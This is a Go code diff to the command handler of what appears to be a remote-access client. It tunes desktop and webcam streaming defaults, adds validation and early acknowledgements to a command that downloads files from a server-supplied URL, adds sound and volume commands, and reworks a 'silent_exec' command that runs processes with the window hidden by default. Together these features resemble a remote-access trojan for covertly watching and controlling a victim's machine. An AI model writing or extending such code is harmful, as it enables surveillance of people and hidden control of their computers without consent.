@@ -390,7 +390,8 @@ func sendCommandResultSafe(env *runtime.Env, cmdID string, ok bool, message stri
 	if message != "" {
 		res.Message = message
 	}
-	if err := wire.WriteMsg(context.Background(), env.Conn, res); err != nil {
+	// Control path so results are not starved by desktop/webcam media frames.
+	if err := wire.WriteControlMsg(context.Background(), env.Conn, res); err != nil {
 		log.Printf("command_result send failed: %v", err)
 	}
 }
@@ -871,7 +872,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		return nil
 	case "desktop_set_resolution":
 		payload, _ := envelope["payload"].(map[string]interface{})
-		maxH := 0 // default = 1080p cap
+		maxH := 480 // default = 480p cap
 		if payload != nil {
 			if v, ok := payloadInt(payload, "maxHeight"); ok {
 				maxH = v
@@ -883,7 +884,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		return nil
 	case "desktop_set_profile":
 		payload, _ := envelope["payload"].(map[string]interface{})
-		maxH, fps := 1080, 60
+		maxH, fps := 480, 15
 		if payload != nil {
 			if v, ok := payloadInt(payload, "maxHeight"); ok {
 				maxH = v
@@ -892,7 +893,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				fps = v
 			}
 		}
-		SetDesktopTargetFPS(30)
+		SetDesktopTargetFPS(15)
 		capture.SetMaxResolution(maxH)
 		fps = SetDesktopTargetFPS(fps)
 		log.Printf("desktop: set stream profile max_height=%d fps=%d", maxH, fps)
@@ -935,7 +936,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		return nil
 	case "desktop_set_fps":
 		payload, _ := envelope["payload"].(map[string]interface{})
-		fps := 120
+		fps := 15
 		if payload != nil {
 			if v, ok := payloadInt(payload, "fps"); ok {
 				fps = v
@@ -2694,9 +2695,33 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		return HandleFileUpload(ctx, env, cmdID, path, data, offset, total, transferID)
 	case "file_upload_http":
 		payload, _ := envelope["payload"].(map[string]interface{})
+		if payload == nil {
+			return wire.WriteControlMsg(ctx, env.Conn, wire.CommandResult{
+				Type: "command_result", CommandID: cmdID, OK: false, Message: "missing payload",
+			})
+		}
 		path, _ := payload["path"].(string)
 		sourceURL, _ := payload["url"].(string)
 		total := payloadNumberToInt64(payload["total"])
+		if path == "" || sourceURL == "" {
+			return wire.WriteControlMsg(ctx, env.Conn, wire.CommandResult{
+				Type: "command_result", CommandID: cmdID, OK: false,
+				Message: fmt.Sprintf("invalid file_upload_http payload (path=%q url=%q)", path, sourceURL),
+			})
+		}
+
+		// Immediate control-priority ack so server idle watchdogs do not false-fail
+		// while the async pull starts (and so media frames cannot starve the ack).
+		_ = wire.WriteControlMsg(ctx, env.Conn, wire.CommandProgress{
+			Type:        "command_progress",
+			CommandID:   cmdID,
+			Path:        path,
+			URL:         sourceURL,
+			Status:      "accepted",
+			Transferred: 0,
+			Total:       total,
+			Message:     "file_upload_http accepted",
+		})
 
 		uploadCtx, cancel := context.WithCancel(ctx)
 		registerCancellableCommand(cmdID, cancel)
@@ -3023,6 +3048,15 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 	case "set_wallpaper":
 		payload := payloadAsMap(envelope["payload"])
 		return handleSetWallpaper(ctx, env, cmdID, payload)
+	case "system_volume":
+		payload := payloadAsMap(envelope["payload"])
+		return handleSystemVolume(ctx, env, cmdID, payload)
+	case "play_sound":
+		payload := payloadAsMap(envelope["payload"])
+		return handlePlaySound(ctx, env, cmdID, payload)
+	case "stop_sound":
+		payload := payloadAsMap(envelope["payload"])
+		return handleStopSound(ctx, env, cmdID, payload)
 	case "silent_exec":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		if payload == nil {
@@ -3044,7 +3078,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				command = command[1 : len(command)-1]
 			}
 		}
-		argsRaw, _ := payload["args"].(string)
+		args := extractSilentExecArgs(payload["args"])
 		hideWindow := true
 		if v, ok := payload["hideWindow"].(bool); ok {
 			hideWindow = v
@@ -3053,7 +3087,6 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		if command == "" {
 			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "missing command"})
 		}
-		args := parseCommandArgs(argsRaw)
 		if err := startSilentProcess(command, args, cwd, hideWindow); err != nil {
 			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
 		}
